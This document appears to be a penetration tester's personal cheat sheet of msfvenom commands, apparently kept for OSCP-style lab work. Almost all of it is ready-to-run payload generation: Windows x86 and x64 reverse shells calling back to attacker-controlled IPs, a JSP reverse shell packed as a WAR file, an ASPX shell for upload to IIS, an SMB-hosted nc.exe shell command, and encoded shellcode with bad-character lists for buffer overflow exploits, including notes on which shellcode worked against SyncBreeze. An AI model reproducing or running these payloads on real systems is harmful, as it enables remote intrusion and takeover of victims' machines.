##  Create a command on  a x86 arch that runs cmd to run an smbshare nc.exe reverse shell. Set safe exit function and set encoding
## Remove bad chars, format out is python

```
msfvenom -a x86 --platform Windows -p windows/exec cmd='cmd /c \\10.10.14.25\temp\nc.exe 10.10.14.25 3333 -e cmd' exitfunc=thread -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python
```


## Same as above but with a reverse shell payload

```
msfvenom -a x86 --platform Windows -p windows/shell/reverse_tcp LHOST='10.10.14.25' LPORT='3333' exitfunc=thread -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python
```


## reverse shell on windows x86 output to .exe

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.31 LPORT=3333 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f exe -a x86 --platform windows > rShell.exe
```


## Generate WAR file with a jsp reverse shell:

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.7 LPORT=1234 -f war > shell.war

```

## Reverse shell python

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.31 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f py -v shellcode -a x86 --platform windows

```

## Reverse shell 64 bit

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.31 LPORT=5555 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f hex -a x64 --platform windows
```


## Run a command on a 64 bit system, output as hex

```
msfvenom -a x64 --platform windows -p windows/x64/exec cmd='cmd /c whoami' exitfunc=thread -f hex
```

## Create a Reverse shell to upload to an asp.net IIS server:

```
msfvenom -p windows/shell/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx
```

## Reverse shell on a 32 bit windows 7 machine with encoder, output as c 

```
msfvenom -p windows/shell_reverse_tcp -f exe --platform windows -a x86 -e x86/alpha_mixed -f c -b "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x3d\x3b\x2d\x2c\x2e\x24\x25\x1a" LHOST=192.168.118.3 LPORT=443

-e --> Encoder
-f --> format (if you use the 'c' format, you get a nice array of hex)
```

## Set Variable for shellcode:

```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.162 LPORT=443  EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f py -v shellcode > shells.txt
```


## --------------------------------------
## The shellcode I used for OSCP syncbreeze:


## Note These did not work!!!
## I think it might have been the "-e" or the "-a" flag
```
msfvenom -a x86 --platform Windows -p windows/shell/reverse_tcp LHOST='127.0.0.1' LPORT='4444' exitfunc=thread  –e x86/shikata_ga_nai -b '\x00\x0a\x0d\x25\x26\x2b\x3d' -v shellcode -f python
```

```
msfvenom -a x86 --platform Windows -p windows/exec cmd='cmd /c touch C:\pwn.txt' exitfunc=thread  –e x86/shikata_ga_nai -b '\x00\x0a\x0d\x25\x26\x2b\x3d' -v shellcode -f python
```

## This worked:
## for some reaseon it seems like "-e" or "-a" might be messing with some things...

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.4 LPORT=5555 EXITFUNC=thread -f python -v shellcode -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
```
## --------------------------------------
